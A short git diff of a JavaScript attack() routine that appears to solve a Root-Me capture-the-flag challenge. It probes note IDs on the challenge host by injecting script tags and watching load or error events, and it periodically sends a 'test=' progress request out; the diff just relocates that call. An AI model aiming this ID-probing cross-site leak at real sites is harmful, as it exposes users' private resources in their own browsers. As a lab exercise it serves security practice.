@@ -10,14 +10,13 @@ var idFound = false;
 async function attack() {
     let i = 0;
     while (!idFound) {
-        if (i % 100000 == 0) sendRequest("test="+i)
         try {
             await new Promise((resolve, reject) => {
                 //fetch page
                 var script = document.createElement('script');
                 script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}`;
                 document.body.appendChild(script);
-
+                
                 // When script loads, caculate the time it took to finish the request
                 script.onload = () => {
                     idFound = true;
@@ -25,6 +24,7 @@ async function attack() {
                     resolve();
                 }
                 script.onerror = reject;
+                if (i % 100000 == 0) sendRequest("test="+i)
             })
             
         } catch (error) {
